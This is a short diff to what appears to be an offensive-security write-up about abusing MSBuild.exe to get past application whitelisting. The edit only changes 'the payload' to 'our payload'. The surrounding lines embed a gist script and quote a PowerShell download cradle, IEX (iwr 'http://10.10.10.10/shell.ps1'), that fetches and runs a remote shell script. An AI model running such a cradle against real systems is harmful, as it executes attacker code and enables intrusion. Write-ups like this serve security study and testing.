@@ -23,7 +23,7 @@ However, assuming that MSBuild.exe is allowed, we can have it execute a ".csproj
 
 <script src="https://gist.github.com/egre55/7a6b6018c9c5ae88c63bdb23879df4d0.js"></script>
 
-This executes the second stage of the payload via a PowerShell 3.0+ download cradle:
+This executes the second stage of our payload via a PowerShell 3.0+ download cradle:
 
 `pipeline.Commands.AddScript("IEX (iwr 'http://10.10.10.10/shell.ps1')");`
 
